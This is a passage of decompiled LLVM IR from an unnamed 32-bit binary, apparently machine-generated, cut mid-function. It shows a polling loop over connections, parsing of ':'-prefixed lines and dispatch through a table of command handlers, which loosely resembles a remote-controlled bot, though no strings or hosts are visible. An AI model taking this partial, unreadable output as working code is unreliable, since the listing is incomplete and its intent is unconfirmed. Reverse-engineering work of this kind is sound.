  %stack_var_-6168 = alloca i32, align 4
  %stack_var_-6424 = alloca i32, align 4
  %stack_var_-6688 = alloca i32, align 4
  store i32 268452084, i32* @lr, align 4
  %v3_100040f0 = call i32 @function_10004f90(i32 ptrtoint ([19 x i8]* @global_var_1000e220.175 to i32), i32 ptrtoint (i32* @global_var_1000d3e8.18 to i32))
  %v3_10004100 = icmp eq i32 %v3_100040f0, 0
  br i1 %v3_10004100, label %dec_label_pc_10004108, label %dec_label_pc_1000412c

dec_label_pc_10004108:                            ; preds = %dec_label_pc_100040b8
  store i32 268452132, i32* @lr, align 4
  %v3_10004120 = call i32 @function_10004f90(i32 ptrtoint ([13 x i8]* @global_var_1000e234.176 to i32), i32 ptrtoint (i32* @global_var_1000d3e8.18 to i32))
  br label %dec_label_pc_1000412c

dec_label_pc_1000412c:                            ; preds = %dec_label_pc_100040b8, %dec_label_pc_10004108
  %stack_var_-6704.0 = phi i32 [ %v3_10004120, %dec_label_pc_10004108 ], [ %v3_100040f0, %dec_label_pc_100040b8 ]
  %stack_var_-6700.0 = phi i8* [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1000e234.176, i32 0, i32 0), %dec_label_pc_10004108 ], [ getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_1000e220.175, i32 0, i32 0), %dec_label_pc_100040b8 ]
  %v3_10004130 = icmp eq i32 %stack_var_-6704.0, 0
  br i1 %v3_10004130, label %dec_label_pc_100042ac, label %dec_label_pc_10004138

dec_label_pc_10004138:                            ; preds = %dec_label_pc_1000412c
  %v2_1000413c = load i32, i32* %arg2, align 4
  store i32 %v2_1000413c, i32* @r3, align 4
  %v0_10004144 = call i32 @function_10007288()
  %v2_10004158 = ptrtoint i32* %stack_var_-6688 to i32
  store i32 268452200, i32* @lr, align 4
  %v2_10004164 = call i32 @function_10004b44(i32 %v2_10004158, i32 256)
  store i32 ptrtoint (i32* @global_var_1000e244.177 to i32), i32* @r4, align 4
  %v2_10004178 = bitcast i32* %stack_var_-6688 to i8*
  %v3_10004178 = call i32 @function_10007234(i8* %v2_10004178, i32 ptrtoint (i32* @global_var_1000e244.177 to i32))
  %v3_10004180 = icmp eq i32 %v3_10004178, 0
  br i1 %v3_10004180, label %dec_label_pc_100042a4, label %dec_label_pc_10004198.preheader

dec_label_pc_10004198.preheader:                  ; preds = %dec_label_pc_10004138
  %v2_1000419c103 = load i32, i32* %arg2, align 4
  %v2_100041a4104 = add i32 %v2_1000419c103, %v0_10004144
  %v1_100041a8105 = inttoptr i32 %v2_100041a4104 to i8*
  %v2_100041a8106 = load i8, i8* %v1_100041a8105, align 1
  %v3_100041b0110 = icmp eq i8 %v2_100041a8106, 47
  br i1 %v3_100041b0110, label %dec_label_pc_100041b8, label %dec_label_pc_1000418c

dec_label_pc_1000418c:                            ; preds = %dec_label_pc_10004198.preheader, %dec_label_pc_1000418c
  %stack_var_-6708.0111 = phi i32 [ %v1_10004190, %dec_label_pc_1000418c ], [ %v0_10004144, %dec_label_pc_10004198.preheader ]
  %v1_10004190 = add i32 %stack_var_-6708.0111, -1
  %v2_1000419c = load i32, i32* %arg2, align 4
  %v2_100041a4 = add i32 %v2_1000419c, %v1_10004190
  %v1_100041a8 = inttoptr i32 %v2_100041a4 to i8*
  %v2_100041a8 = load i8, i8* %v1_100041a8, align 1
  %v3_100041b0 = icmp eq i8 %v2_100041a8, 47
  br i1 %v3_100041b0, label %dec_label_pc_100041b8, label %dec_label_pc_1000418c

dec_label_pc_100041b8:                            ; preds = %dec_label_pc_1000418c, %dec_label_pc_10004198.preheader
  %stack_var_-6708.0.lcssa = phi i32 [ %v0_10004144, %dec_label_pc_10004198.preheader ], [ %v1_10004190, %dec_label_pc_1000418c ]
  %v2_100041bc = load i32, i32* %arg2, align 4
  %v2_100041c4 = add i32 %v2_100041bc, %stack_var_-6708.0.lcssa
  %v2_100041c8 = ptrtoint i32* %stack_var_-6424 to i32
  store i32 %v2_100041c8, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_100041ec.179 to i32), i32* @lr, align 4
  %v6_100041e8 = call i32 @function_10004fac(i32 %v2_100041c8, i32 ptrtoint ([8 x i8]* @global_var_1000e248.178 to i32), i32 %v2_10004158, i32 %v2_100041c4)
  %v2_100041f0 = ptrtoint i32* %stack_var_-6168 to i32
  br label %dec_label_pc_10004230.outer

dec_label_pc_100041f0:                            ; preds = %dec_label_pc_10004230
  store i32 268452356, i32* @lr, align 4
  %v3_10004200 = call i32 @function_10006950(i32 %v2_100041f0, i32 1024, i32 %stack_var_-6704.0)
  store i32 %v2_100041f0, i32* @r3, align 4
  store i32 %v2_100041c8, i32* @r4, align 4
  %v2_10004214 = call i32 @function_10007710(i32 %v2_100041f0, i32 %v2_100041c8)
  %v3_1000421c = icmp eq i32 %v2_10004214, 0
  br i1 %v3_1000421c, label %dec_label_pc_10004224, label %dec_label_pc_10004230

dec_label_pc_10004224:                            ; preds = %dec_label_pc_100041f0
  %v1_10004228 = add i32 %stack_var_-6712.0.ph, 1
  br label %dec_label_pc_10004230.outer

dec_label_pc_10004230.outer:                      ; preds = %dec_label_pc_10004224, %dec_label_pc_100041b8
  %stack_var_-6712.0.ph = phi i32 [ %v1_10004228, %dec_label_pc_10004224 ], [ 0, %dec_label_pc_100041b8 ]
  br label %dec_label_pc_10004230

dec_label_pc_10004230:                            ; preds = %dec_label_pc_10004230.outer, %dec_label_pc_100041f0
  store i32 268452408, i32* @lr, align 4
  %v1_10004234 = call i32 @function_100068d4(i32 %stack_var_-6704.0)
  %v3_1000423c = icmp eq i32 %v1_10004234, 0
  br i1 %v3_1000423c, label %dec_label_pc_100041f0, label %dec_label_pc_10004244

dec_label_pc_10004244:                            ; preds = %dec_label_pc_10004230
  %v3_10004248 = icmp eq i32 %stack_var_-6712.0.ph, 0
  br i1 %v3_10004248, label %dec_label_pc_10004250, label %dec_label_pc_10004298

dec_label_pc_10004250:                            ; preds = %dec_label_pc_10004244
  store i32 268452440, i32* @lr, align 4
  %v1_10004254 = inttoptr i32 %stack_var_-6704.0 to i16*
  %v2_10004254 = call i32 @function_10004e44(i16* %v1_10004254)
  %v4_10004258 = ptrtoint i8* %stack_var_-6700.0 to i32
  store i32 268452456, i32* @lr, align 4
  %v3_10004264 = call i32 @function_10004f90(i32 %v4_10004258, i32 ptrtoint (i32* @global_var_1000e250.180 to i32))
  %v3_10004274 = icmp eq i32 %v3_10004264, 0
  br i1 %v3_10004274, label %dec_label_pc_100042ac, label %dec_label_pc_1000427c

dec_label_pc_1000427c:                            ; preds = %dec_label_pc_10004250
  store i32 268452492, i32* @lr, align 4
  %v2_10004288 = call i32 @function_10006ab0(i32 %v2_100041c8, i32 %v3_10004264)
  store i32 ptrtoint (i32* @global_var_10004294.181 to i32), i32* @lr, align 4
  %v1_10004290 = inttoptr i32 %v3_10004264 to i16*
  %v2_10004290 = call i32 @function_10004e44(i16* %v1_10004290)
  br label %dec_label_pc_100042ac

dec_label_pc_10004298:                            ; preds = %dec_label_pc_10004244
  store i32 ptrtoint (i32* @global_var_100042a0.182 to i32), i32* @lr, align 4
  %v1_1000429c = inttoptr i32 %stack_var_-6704.0 to i16*
  %v2_1000429c = call i32 @function_10004e44(i16* %v1_1000429c)
  br label %dec_label_pc_100042ac

dec_label_pc_100042a4:                            ; preds = %dec_label_pc_10004138
  store i32 ptrtoint (i32* @global_var_100042ac.183 to i32), i32* @lr, align 4
  %v1_100042a8 = inttoptr i32 %stack_var_-6704.0 to i16*
  %v2_100042a8 = call i32 @function_10004e44(i16* %v1_100042a8)
  br label %dec_label_pc_100042ac

dec_label_pc_100042ac:                            ; preds = %dec_label_pc_10004250, %dec_label_pc_1000412c, %dec_label_pc_10004298, %dec_label_pc_1000427c, %dec_label_pc_100042a4
  store i32 268452528, i32* @lr, align 4
  %v0_100042ac = call i32 @function_10004afc()
  %v3_100042b4 = icmp eq i32 %v0_100042ac, 0
  br i1 %v3_100042b4, label %dec_label_pc_100042c4, label %dec_label_pc_100042bc

dec_label_pc_100042bc:                            ; preds = %dec_label_pc_100042ac
  %v0_100042c0 = call i32 @function_10008dd8()
  br label %dec_label_pc_100042c4

dec_label_pc_100042c4:                            ; preds = %dec_label_pc_100042ac, %dec_label_pc_100042bc
  %v2_100042c8 = load i32, i32* %arg2, align 4
  store i32 %v2_100042c8, i32* @r3, align 4
  %v0_100042d8 = call i32 @function_10007288()
  store i32 ptrtoint ([6 x i8]* @global_var_1000e254.184 to i32), i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_100042f4.185 to i32), i32* @lr, align 4
  %v4_100042f0 = call i32 @function_10007418(i32 %v2_100042c8, i32 ptrtoint ([6 x i8]* @global_var_1000e254.184 to i32), i32 %v0_100042d8)
  %v2_1000436048 = icmp sgt i32 %arg1, 1
  br i1 %v2_1000436048, label %dec_label_pc_10004300, label %dec_label_pc_10004368

dec_label_pc_10004300:                            ; preds = %dec_label_pc_100042c4, %dec_label_pc_10004300
  %storemerge1051 = phi i32 [ %v1_10004350, %dec_label_pc_10004300 ], [ 1, %dec_label_pc_100042c4 ]
  %v1_10004304 = mul i32 %storemerge1051, 4
  %v2_10004310 = add i32 %v1_10004304, %tmp
  %v1_10004314 = inttoptr i32 %v2_10004310 to i32*
  %v2_10004314 = load i32, i32* %v1_10004314, align 4
  store i32 %v2_10004314, i32* @r3, align 4
  %v0_10004334 = call i32 @function_10007288()
  store i32 268452684, i32* @lr, align 4
  %v3_10004348 = call i32 @function_100071a4(i32 %v2_10004314, i32 0, i32 %v0_10004334)
  %v1_10004350 = add nuw nsw i32 %storemerge1051, 1
  %v2_10004360 = icmp slt i32 %v1_10004350, %arg1
  br i1 %v2_10004360, label %dec_label_pc_10004300, label %dec_label_pc_10004368

dec_label_pc_10004368:                            ; preds = %dec_label_pc_10004300, %dec_label_pc_100042c4
  store i32 268452720, i32* @lr, align 4
  %v1_1000436c = call i32 @function_10004d80(i32 0)
  store i32 268452728, i32* @lr, align 4
  %v0_10004374 = call i32 @function_10004c60()
  %v2_1000437c = xor i32 %v1_1000436c, %v0_10004374
  store i32 268452740, i32* @lr, align 4
  %v0_10004380 = call i32 @function_10004ca8()
  %v2_10004388 = add i32 %v2_1000437c, %v0_10004380
  store i32 268452756, i32* @lr, align 4
  %v1_10004390 = call i32 @function_10008854(i32 %v2_10004388)
  store i32 268452760, i32* @lr, align 4
  %v0_10004394 = call i32 @function_100007d4()
  store i32 %v0_10004394, i32* @global_var_10010474.145, align 4
  store i32 268452776, i32* @lr, align 4
  %v0_100043a4 = call i32 @function_100007d4()
  store i32 %v0_100043a4, i32* @global_var_10010470.19, align 4
  store i32 268452792, i32* @lr, align 4
  %v0_100043b4 = call i32 @function_100007d4()
  store i32 %v0_100043b4, i32* @global_var_1001047c.186, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1000e25c.187 to i32), i32* @global_var_10010488.143, align 4
  store i32 ptrtoint (i32* @global_var_1000e260.188 to i32), i32* @global_var_10010484.159, align 4
  store i32 0, i32* @global_var_10010480.106, align 4
  %v2_1000443c = ptrtoint i32* %stack_var_-6424 to i32
  %v2_10004494 = ptrtoint i32* %stack_var_-6744 to i32
  %v2_10004498 = add i32 %v2_10004494, 320
  %v2_100044f0 = ptrtoint i32* %stack_var_-6432 to i32
  %v2_10004704 = ptrtoint i32* %stack_var_-4120 to i32
  %v2_100047f0 = ptrtoint i32* %stack_var_-5144 to i32
  %v2_10004898 = ptrtoint i32* %stack_var_-6168 to i32
  %v2_10004738 = add i32 %v2_10004494, 2624
  br label %dec_label_pc_100043f4

dec_label_pc_100043f4:                            ; preds = %dec_label_pc_10004480, %dec_label_pc_100046fc, %dec_label_pc_10004970, %dec_label_pc_10004368
  store i32 268452856, i32* @lr, align 4
  %v0_100043f4 = call i32 @function_10003dbc()
  %v3_100043fc = load i32, i32* @global_var_10010478.10, align 4
  %v3_10004404 = load i32, i32* @global_var_10010474.145, align 4
  %v3_1000440c = load i32, i32* @global_var_10010470.19, align 4
  %v7_10004434 = call i32 @function_1000041c(i32 %v3_100043fc, i32 ptrtoint ([41 x i8]* @global_var_1000e264.189 to i32), i32 %v3_10004404, i32 %v3_1000440c)
  br label %dec_label_pc_1000443c

dec_label_pc_1000443c:                            ; preds = %dec_label_pc_100046bc, %dec_label_pc_10004730, %dec_label_pc_10004990, %dec_label_pc_100049b4, %dec_label_pc_100043f4
  br label %dec_label_pc_10004450

dec_label_pc_10004450:                            ; preds = %dec_label_pc_1000443c, %dec_label_pc_10004450
  %storemerge1123 = phi i32 [ 0, %dec_label_pc_1000443c ], [ %v1_1000446c, %dec_label_pc_10004450 ]
  %v1_10004458 = mul nuw nsw i32 %storemerge1123, 4
  %v2_1000445c = add i32 %v1_10004458, %v2_1000443c
  %v2_10004464 = inttoptr i32 %v2_1000445c to i32*
  store i32 0, i32* %v2_10004464, align 4
  %v1_1000446c = add nuw nsw i32 %storemerge1123, 1
  %tmp79 = icmp ult i32 %v1_1000446c, 32
  br i1 %tmp79, label %dec_label_pc_10004450, label %dec_label_pc_10004480

dec_label_pc_10004480:                            ; preds = %dec_label_pc_10004450
  %v3_10004484 = load i32, i32* @global_var_10010478.10, align 4
  %v1_10004488 = udiv i32 %v3_10004484, 32
  %v1_10004490 = mul nuw nsw i32 %v1_10004488, 4
  %v1_1000449c = add i32 %v1_10004490, %v2_10004498
  %v1_100044a0 = inttoptr i32 %v1_1000449c to i32*
  %v2_100044a0 = load i32, i32* %v1_100044a0, align 4
  %v1_100044ac = urem i32 %v3_10004484, 32
  %v3_100044b4 = shl i32 1, %v1_100044ac
  %v2_100044b8 = or i32 %v2_100044a0, %v3_100044b4
  store i32 %v2_100044b8, i32* %v1_100044a0, align 4
  store i32 1200, i32* %stack_var_-6432, align 4
  %v3_100044e4 = load i32, i32* @global_var_10010478.10, align 4
  %v1_100044e8 = add i32 %v3_100044e4, 1
  store i32 268453132, i32* @lr, align 4
  %v6_10004508 = call i32 @function_10004d38(i32 %v1_100044e8, i32 %v2_1000443c, i32 0, i32 0, i32 %v2_100044f0, i32 %v2_1000443c)
  %tmp80 = icmp slt i32 %v6_10004508, 1
  br i1 %tmp80, label %dec_label_pc_100043f4, label %dec_label_pc_100046a8.preheader

dec_label_pc_100046a8.preheader:                  ; preds = %dec_label_pc_10004480
  %v3_100046ac28 = load i32, i32* @global_var_10010468.13, align 4
  %v2_100046b429 = icmp eq i32 %v3_100046ac28, 0
  br i1 %v2_100046b429, label %dec_label_pc_100046bc, label %dec_label_pc_10004524

dec_label_pc_10004524:                            ; preds = %dec_label_pc_100046a8.preheader, %dec_label_pc_1000469c
  %storemerge1231 = phi i32 [ %.pre, %dec_label_pc_1000469c ], [ 0, %dec_label_pc_100046a8.preheader ]
  %v1_10004528 = mul i32 %storemerge1231, 4
  %v3_10004534 = load i32, i32* @global_var_1001048c.14, align 4
  %v2_10004538 = add i32 %v3_10004534, %v1_10004528
  %v1_1000453c = inttoptr i32 %v2_10004538 to i32*
  %v2_1000453c = load i32, i32* %v1_1000453c, align 4
  store i32 268453200, i32* @lr, align 4
  %v3_1000454c = call i32 @function_10004dc8(i32 %v2_1000453c, i32 0, i32 1)
  %tmp81 = icmp slt i32 %v3_1000454c, 1
  %.pre = add i32 %storemerge1231, 1
  br i1 %tmp81, label %dec_label_pc_1000469c, label %dec_label_pc_100045b4.preheader

dec_label_pc_100045b4.preheader:                  ; preds = %dec_label_pc_10004524
  %v3_100045b885 = load i32, i32* @global_var_10010468.13, align 4
  %v2_100045c086 = icmp ult i32 %.pre, %v3_100045b885
  %v1_1000457087 = mul i32 %.pre, 4
  %v3_1000457c88 = load i32, i32* @global_var_1001048c.14, align 4
  %v2_1000458089 = add i32 %v3_1000457c88, %v1_1000457087
  br i1 %v2_100045c086, label %dec_label_pc_1000456c, label %dec_label_pc_100045c8

dec_label_pc_1000456c:                            ; preds = %dec_label_pc_100045b4.preheader, %dec_label_pc_1000456c
  %v2_1000458093 = phi i32 [ %v2_10004580, %dec_label_pc_1000456c ], [ %v2_1000458089, %dec_label_pc_100045b4.preheader ]
  %v1_1000456090 = phi i32 [ %v1_10004560, %dec_label_pc_1000456c ], [ %.pre, %dec_label_pc_100045b4.preheader ]
  %v1_10004584 = add i32 %v2_1000458093, -4
  %v1_100045a0 = inttoptr i32 %v2_1000458093 to i32*
  %v2_100045a0 = load i32, i32* %v1_100045a0, align 4
  %v2_100045a4 = inttoptr i32 %v1_10004584 to i32*
  store i32 %v2_100045a0, i32* %v2_100045a4, align 4
  %v1_10004560 = add i32 %v1_1000456090, 1
  %v3_100045b8 = load i32, i32* @global_var_10010468.13, align 4
  %v2_100045c0 = icmp ult i32 %v1_10004560, %v3_100045b8
  %v1_10004570 = mul i32 %v1_10004560, 4
  %v3_1000457c = load i32, i32* @global_var_1001048c.14, align 4
  %v2_10004580 = add i32 %v3_1000457c, %v1_10004570
  br i1 %v2_100045c0, label %dec_label_pc_1000456c, label %dec_label_pc_100045c8

dec_label_pc_100045c8:                            ; preds = %dec_label_pc_1000456c, %dec_label_pc_100045b4.preheader
  %v2_10004580.lcssa = phi i32 [ %v2_1000458089, %dec_label_pc_100045b4.preheader ], [ %v2_10004580, %dec_label_pc_1000456c ]
  %v1_100045e0 = add i32 %v2_10004580.lcssa, -4
  %v2_100045e8 = inttoptr i32 %v1_100045e0 to i32*
  store i32 0, i32* %v2_100045e8, align 4
  %v3_100045f0 = load i32, i32* @global_var_10010468.13, align 4
  %v1_100045f4 = add i32 %v3_100045f0, -1
  store i32 %v1_100045f4, i32* @global_var_10010468.13, align 4
  %v1_10004608 = mul i32 %v1_100045f4, 4
  %v1_1000460c = add i32 %v1_10004608, 4
  store i32 %v1_1000460c, i32* @r3, align 4
  store i32 268453400, i32* @lr, align 4
  %v0_10004614 = call i32 @function_100080a0()
  %v3_1000467024 = load i32, i32* @global_var_10010468.13, align 4
  %v2_1000467825 = icmp eq i32 %v3_1000467024, 0
  br i1 %v2_1000467825, label %dec_label_pc_10004680, label %dec_label_pc_1000462c

dec_label_pc_1000462c:                            ; preds = %dec_label_pc_100045c8, %dec_label_pc_1000462c
  %storemerge1927 = phi i32 [ %v1_10004664, %dec_label_pc_1000462c ], [ 0, %dec_label_pc_100045c8 ]
  %v1_10004630 = mul i32 %storemerge1927, 4
  %v2_1000463c = add i32 %v1_10004630, %v0_10004614
  %v3_10004650 = load i32, i32* @global_var_1001048c.14, align 4
  %v2_10004654 = add i32 %v3_10004650, %v1_10004630
  %v1_10004658 = inttoptr i32 %v2_10004654 to i32*
  %v2_10004658 = load i32, i32* %v1_10004658, align 4
  %v2_1000465c = inttoptr i32 %v2_1000463c to i32*
  store i32 %v2_10004658, i32* %v2_1000465c, align 4
  %v1_10004664 = add i32 %storemerge1927, 1
  %v3_10004670 = load i32, i32* @global_var_10010468.13, align 4
  %v2_10004678 = icmp ult i32 %v1_10004664, %v3_10004670
  br i1 %v2_10004678, label %dec_label_pc_1000462c, label %dec_label_pc_1000466c.dec_label_pc_10004680_crit_edge

dec_label_pc_1000466c.dec_label_pc_10004680_crit_edge: ; preds = %dec_label_pc_1000462c
  br label %dec_label_pc_10004680

dec_label_pc_10004680:                            ; preds = %dec_label_pc_100045c8, %dec_label_pc_1000466c.dec_label_pc_10004680_crit_edge
  %v3_10004684 = load i32, i32* @global_var_1001048c.14, align 4
  store i32 %v3_10004684, i32* @r3, align 4
  store i32 268453520, i32* @lr, align 4
  %v0_1000468c = call i32 @function_100081f8()
  store i32 %v0_10004614, i32* @global_var_1001048c.14, align 4
  br label %dec_label_pc_1000469c

dec_label_pc_1000469c:                            ; preds = %dec_label_pc_10004524, %dec_label_pc_10004680
  %v3_100046ac = load i32, i32* @global_var_10010468.13, align 4
  %v2_100046b4 = icmp ult i32 %.pre, %v3_100046ac
  br i1 %v2_100046b4, label %dec_label_pc_10004524, label %dec_label_pc_100046bc

dec_label_pc_100046bc:                            ; preds = %dec_label_pc_100046a8.preheader, %dec_label_pc_1000469c
  %v3_100046c0 = load i32, i32* @global_var_10010478.10, align 4
  %v1_100046c4 = udiv i32 %v3_100046c0, 32
  %v1_100046c8 = mul nuw nsw i32 %v1_100046c4, 4
  %v1_100046d4 = add i32 %v1_100046c8, %v2_10004498
  %v1_100046d8 = inttoptr i32 %v1_100046d4 to i32*
  %v2_100046d8 = load i32, i32* %v1_100046d8, align 4
  %v1_100046e4 = urem i32 %v3_100046c0, 32
  %v3_100046e8 = sub i32 0, %v3_100046c0
  %v4_100046e8 = urem i32 %v3_100046e8, 32
  %v5_100046e8 = shl i32 %v2_100046d8, %v4_100046e8
  %v6_100046e8 = xor i32 %v4_100046e8, 31
  %v7_100046e8 = lshr i32 %v2_100046d8, %v6_100046e8
  %v8_100046e8 = udiv i32 %v7_100046e8, 2
  %v9_100046e8 = or i32 %v8_100046e8, %v5_100046e8
  %v12_100046e8 = lshr i32 -1, %v1_100046e4
  %tmp116 = icmp slt i32 %v2_100046d8, 0
  %v15_100046e820 = zext i1 %tmp116 to i32
  %v16_100046e8 = xor i32 %v12_100046e8, 1
  %v17_100046e8 = and i32 %v15_100046e820, %v16_100046e8
  %v14_100046e8 = urem i32 %v12_100046e8, 2
  %v14_100046e8.masked = and i32 %v14_100046e8, %v9_100046e8
  %v1_100046f0 = or i32 %v14_100046e8.masked, %v17_100046e8
  %v3_100046f4 = icmp eq i32 %v1_100046f0, 0
  br i1 %v3_100046f4, label %dec_label_pc_1000443c, label %dec_label_pc_100046fc

dec_label_pc_100046fc:                            ; preds = %dec_label_pc_100046bc
  store i32 268453660, i32* @lr, align 4
  %v4_10004718 = call i32 @function_10007fb8(i32 %v3_100046c0, i32 %v2_10004704, i32 4096, i32 0)
  store i32 %v4_10004718, i32* %stack_var_-6744, align 4
  %tmp82 = icmp slt i32 %v4_10004718, 1
  br i1 %tmp82, label %dec_label_pc_100043f4, label %dec_label_pc_10004730

dec_label_pc_10004730:                            ; preds = %dec_label_pc_100046fc
  %v3_10004740 = add i32 %v2_10004738, %v4_10004718
  %v4_10004740 = inttoptr i32 %v3_10004740 to i8*
  store i8 0, i8* %v4_10004740, align 1
  store i32 ptrtoint (i32* @global_var_1000e290.191 to i32), i32* @r4, align 4
  store i32 268453720, i32* @lr, align 4
  %v3_10004754 = call i32 @function_100077b0(i32 %v2_10004704, i32 ptrtoint (i32* @global_var_1000e290.191 to i32), i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v3_100049ac45 = icmp eq i32 %v3_10004754, 0
  br i1 %v3_100049ac45, label %dec_label_pc_1000443c, label %dec_label_pc_100049b4

dec_label_pc_10004764:                            ; preds = %dec_label_pc_100049b4
  store i32 268453740, i32* @lr, align 4
  %v2_10004768 = call i32 @function_10000724(i32 %storemerge47.in)
  %v2_10004770 = load i8, i8* %storemerge47, align 1
  %v3_10004778 = icmp eq i8 %v2_10004770, 58
  br i1 %v3_10004778, label %dec_label_pc_10004798.preheader, label %dec_label_pc_10004824

dec_label_pc_10004798.preheader:                  ; preds = %dec_label_pc_10004764
  store i32 0, i32* %stack_var_-6744, align 4
  store i32 %storemerge47.in, i32* @r3, align 4
  %v0_100047a032 = call i32 @function_10007288()
  %v2_100047a834 = icmp eq i32 %v0_100047a032, 0
  br i1 %v2_100047a834, label %dec_label_pc_100047d0, label %dec_label_pc_100047b0

dec_label_pc_1000478c:                            ; preds = %dec_label_pc_100047b0
  %v1_10004790 = add i32 %v3_100047b0, 1
  store i32 %v1_10004790, i32* %stack_var_-6744, align 4
  store i32 %storemerge47.in, i32* @r3, align 4
  %v0_100047a0 = call i32 @function_10007288()
  %v2_100047a8 = icmp ult i32 %v1_10004790, %v0_100047a0
  br i1 %v2_100047a8, label %dec_label_pc_100047b0, label %dec_label_pc_100047d0

dec_label_pc_100047b0:                            ; preds = %dec_label_pc_10004798.preheader, %dec_label_pc_1000478c
  %v3_100047b0 = load i32, i32* %stack_var_-6744, align 4
  %v2_100047bc = add i32 %v3_100047b0, %storemerge47.in
  %v1_100047c0 = inttoptr i32 %v2_100047bc to i8*
  %v2_100047c0 = load i8, i8* %v1_100047c0, align 1
  %v3_100047c8 = icmp eq i8 %v2_100047c0, 32
  br i1 %v3_100047c8, label %dec_label_pc_100047d0, label %dec_label_pc_1000478c

dec_label_pc_100047d0:                            ; preds = %dec_label_pc_10004798.preheader, %dec_label_pc_1000478c, %dec_label_pc_100047b0
  %v3_100047d0 = load i32, i32* %stack_var_-6744, align 4
  %v2_100047dc = add i32 %v3_100047d0, %storemerge47.in
  %v3_100047e4 = inttoptr i32 %v2_100047dc to i8*
  store i8 0, i8* %v3_100047e4, align 1
  %v1_100047ec = add i32 %storemerge47.in, 1
  %v2_100047fc = inttoptr i32 %v1_100047ec to i8*
  %v3_100047fc = call i32 @function_10007268(i32 %v2_100047f0, i8* %v2_100047fc)
  %v3_10004800 = load i32, i32* %stack_var_-6744, align 4
  %v2_1000480c = add i32 %v3_10004800, %storemerge47.in
  %v1_10004810 = add i32 %v2_1000480c, 1
  %v3_1000481c = inttoptr i32 %v1_10004810 to i8*
  %v4_1000481c = call i32 @function_10007268(i32 %storemerge47.in, i8* %v3_1000481c)
  br label %dec_label_pc_10004848.preheader

dec_label_pc_10004824:                            ; preds = %dec_label_pc_10004764
  store i32 10752, i32* %stack_var_-5144, align 4
  br label %dec_label_pc_10004848.preheader

dec_label_pc_10004848.preheader:                  ; preds = %dec_label_pc_100047d0, %dec_label_pc_10004824
  store i32 0, i32* %stack_var_-6744, align 4
  store i32 %storemerge47.in, i32* @r3, align 4
  %v0_1000485037 = call i32 @function_10007288()
  %v2_1000485839 = icmp eq i32 %v0_1000485037, 0
  br i1 %v2_1000485839, label %dec_label_pc_10004880, label %dec_label_pc_10004860

dec_label_pc_1000483c:                            ; preds = %dec_label_pc_10004860
  %v1_10004840 = add i32 %v3_10004860, 1
  store i32 %v1_10004840, i32* %stack_var_-6744, align 4
  store i32 %storemerge47.in, i32* @r3, align 4
  %v0_10004850 = call i32 @function_10007288()
  %v2_10004858 = icmp ult i32 %v1_10004840, %v0_10004850
  br i1 %v2_10004858, label %dec_label_pc_10004860, label %dec_label_pc_10004880

dec_label_pc_10004860:                            ; preds = %dec_label_pc_10004848.preheader, %dec_label_pc_1000483c
  %v3_10004860 = load i32, i32* %stack_var_-6744, align 4
  %v2_1000486c = add i32 %v3_10004860, %storemerge47.in
  %v1_10004870 = inttoptr i32 %v2_1000486c to i8*
  %v2_10004870 = load i8, i8* %v1_10004870, align 1
  %v3_10004878 = icmp eq i8 %v2_10004870, 32
  br i1 %v3_10004878, label %dec_label_pc_10004880, label %dec_label_pc_1000483c

dec_label_pc_10004880:                            ; preds = %dec_label_pc_10004848.preheader, %dec_label_pc_1000483c, %dec_label_pc_10004860
  %v3_10004880 = load i32, i32* %stack_var_-6744, align 4
  %v2_1000488c = add i32 %v3_10004880, %storemerge47.in
  %v3_10004894 = inttoptr i32 %v2_1000488c to i8*
  store i8 0, i8* %v3_10004894, align 1
  %v4_100048a4 = call i32 @function_10007268(i32 %v2_10004898, i8* %storemerge47)
  %v3_100048a8 = load i32, i32* %stack_var_-6744, align 4
  %v2_100048b4 = add i32 %v3_100048a8, %storemerge47.in
  %v1_100048b8 = add i32 %v2_100048b4, 1
  %v3_100048c4 = inttoptr i32 %v1_100048b8 to i8*
  %v4_100048c4 = call i32 @function_10007268(i32 %storemerge47.in, i8* %v3_100048c4)
  store i32 0, i32* %stack_var_-6744, align 4
  %v2_1000496496 = load i32, i32* bitcast ([4 x i8]** @global_var_100100a4.195 to i32*), align 4
  %v3_1000496899 = icmp eq i32 %v2_1000496496, 0
  br i1 %v3_1000496899, label %dec_label_pc_10004970, label %dec_label_pc_100048d4

dec_label_pc_100048d4:                            ; preds = %dec_label_pc_10004880, %dec_label_pc_100048d4
  %v1_10004964102 = phi i32* [ %v1_10004964, %dec_label_pc_100048d4 ], [ bitcast ([4 x i8]** @global_var_100100a4.195 to i32*), %dec_label_pc_10004880 ]
  %v2_100048e8 = load i32, i32* %v1_10004964102, align 4
  store i32 %v2_100048e8, i32* @r3, align 4
  store i32 %v2_10004898, i32* @r4, align 4
  %v2_100048f8 = call i32 @function_10007710(i32 %v2_100048e8, i32 %v2_10004898)
  %v3_10004908 = load i32, i32* %stack_var_-6744, align 4
  %v1_10004914 = mul i32 %v3_10004908, 8
  %v1_1000491c = add i32 %v1_10004914, add (i32 ptrtoint ([4 x i8]** @global_var_100100a4.195 to i32), i32 4)
  %v1_10004920 = inttoptr i32 %v1_1000491c to i32*
  %v2_10004920 = load i32, i32* %v1_10004920, align 4
  call void @__pseudo_call(i32 %v2_10004920)
  %v3_10004944 = load i32, i32* %stack_var_-6744, align 4
  %v1_10004948 = add i32 %v3_10004944, 1
  store i32 %v1_10004948, i32* %stack_var_-6744, align 4
  %v1_1000495c = mul i32 %v1_10004948, 8
  %v2_10004960 = add i32 %v1_1000495c, ptrtoint ([4 x i8]** @global_var_100100a4.195 to i32)
  %v1_10004964 = inttoptr i32 %v2_10004960 to i32*
  %v2_10004964 = load i32, i32* %v1_10004964, align 4
  %v3_10004968 = icmp eq i32 %v2_10004964, 0
  br i1 %v3_10004968, label %dec_label_pc_10004970, label %dec_label_pc_100048d4

dec_label_pc_10004970:                            ; preds = %dec_label_pc_100048d4, %dec_label_pc_10004880
  store i32 %v2_10004898, i32* @r3, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1000e294.196 to i32), i32* @r4, align 4
  %v3_10004980 = call i32 @function_10007710(i32 %v2_10004898, i32 ptrtoint ([6 x i8]* @global_var_1000e294.196 to i32))
  %v3_10004988 = icmp eq i32 %v3_10004980, 0
  br i1 %v3_10004988, label %dec_label_pc_100043f4, label %dec_label_pc_10004990

